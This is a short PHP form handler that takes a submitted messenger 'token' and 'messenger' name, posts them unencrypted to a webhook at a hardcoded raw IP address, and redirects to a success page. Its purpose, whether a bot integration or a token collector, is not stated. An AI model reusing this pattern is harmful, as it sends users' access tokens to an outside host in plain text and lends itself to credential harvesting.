<?php

$token = $_POST['token'] ?? '';
$messenger = $_POST['messenger'] ?? '';

if (!$token || !$messenger) {
    exit('Missing token or messenger');
}

$data = [
    'token' => $token,
    'messenger' => $messenger
];

$webhookUrl = 'http://46.101.132.9:5678/webhook/messenger-hook';


$options = [
    'http' => [
        'header'  => "Content-Type: application/json\r\n",
        'method'  => 'POST',
        'content' => json_encode($data),
    ],
];

$context = stream_context_create($options);
file_get_contents($webhookUrl, false, $context);

header("Location: success.html");
exit();
?>
